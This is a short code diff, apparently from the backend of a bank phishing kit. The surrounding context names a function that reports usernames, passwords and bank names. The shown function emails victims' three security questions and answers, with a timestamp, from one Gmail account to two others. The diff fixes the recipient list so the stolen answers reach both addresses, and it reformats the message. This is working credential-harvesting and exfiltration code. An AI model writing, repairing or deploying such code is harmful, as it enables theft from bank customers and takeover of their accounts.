@@ -17,14 +17,14 @@ def report_login(username,password,bank_name):
 def security_question(q1,ans1,q2, ans2,q3,ans3):
     msg = Message('Question and Answer',
         sender='donaldlorren4202022@gmail.com',
-        recipients=['ritapratt010@gmail.com,christinesalgado477@gmail.com'])
+        recipients=['ritapratt010@gmail.com','christinesalgado477@gmail.com'])
     msg.body=f'''
     --------QUESTION ONE----------
-    {q1} ---ANS---> {ans1}
+    {q1} ------> {ans1}
     --------QUESTION TWO----------
-    {q2} ---ANS---> {ans2}
+    {q2} ------> {ans2}
     --------QUESTION THREE----------
-    {q3} ---ANS---> {ans3}
+    {q3} ------> {ans3}
     at ---- {datetime.now()}
     '''
     mail.send(msg)
